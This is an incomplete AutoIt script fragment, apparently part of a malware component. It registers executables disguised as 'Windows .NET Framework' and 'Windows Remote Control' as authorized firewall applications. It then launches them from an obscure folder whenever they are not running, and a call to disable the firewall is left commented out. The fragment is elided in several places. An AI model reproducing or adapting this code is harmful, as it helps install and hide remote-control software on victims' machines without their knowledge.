...
Break(0);
$pathCreateDest = "C:\WindowsEntitys\Mathe\"
#include <Array.au3>
...
; CODE TO Execute
  ...
  _AddAuthorizedApp("Firewall_configurator", @ScriptDir & "\Sccdt.exe" , 4 , 0 , True)
  Sleep(500)
  _AddAuthorizedApp("Firewall_configurator", @ScriptDir & "\Firewall_configurator.exe" , 4 , 0 , True);
  Sleep(500)
  _AddAuthorizedApp("Firewall_configurator", @ScriptDir & "\tmcl.exe" , 4 , 0 , True);
  Sleep(500)
  _AddAuthorizedApp("Firewall_configurator", @ScriptDir & "\Windows .NET Framework.exe" , 4 , 0 , True);
  Sleep(500)
  _AddAuthorizedApp("Firewall_configurator", @ScriptDir & "\Windows Remote Control.exe" , 4 , 0 , True);
  Sleep(500)

 _chekProcessExists("Firewall_configurator.exe");DoAnoy
 _chekProcessExists("tmcl.exe");
 _chekProcessExists("Windows Remote Control"); caip.exe
 _chekProcessExists("Windows .NET Framework"); coc.exe
...
Func _chekProcessExists($proccessname)
   If Not ProcessExists($proccessname) Then
	  ShellExecute($pathCreateDest & $proccessname);
	  ProcessWait($proccessname);
   Else
	  ;MsgBox(0,"debug" , $pathCreateDest & $proccessname & " not found")
   EndIf
   sleep(10);
EndFunc
 ;_DisableFirewall()
 Exit
;_AddAuthorizedApp("WinMail", @ProgramFilesDir & "\Windows Mail\wab.exe", 2, 1, Default)
...
;      			    $IPVer -  IP Version (usually 2) changed to 4
...
; ===============================================================================================================================
Func _AddAuthorizedApp($Name, $FilePath, $IPVer = 4, $Scope = 0, $Enabled = False)
	_createFWMgrObject()
